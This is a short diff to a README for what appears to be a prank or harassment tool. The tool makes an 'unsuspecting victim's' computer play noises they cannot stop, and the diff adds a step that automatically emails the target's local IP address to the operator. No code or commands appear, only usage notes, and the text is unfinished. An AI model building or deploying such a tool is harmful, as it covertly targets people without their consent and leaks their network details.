@@ -8,5 +8,6 @@ Quickstart
 3 profit as your unsuspecting victim cant stop their computer from exploding with noises
 
 # Server options
-1 you need your targets local ip address
+1 you need your targets local ip address which will be automatically sent to your email by changing the "email_name" variable in recieve server
 2 change send.py ip addresses and profit the program will do the rest
+3 etc im not done writing this bullshit
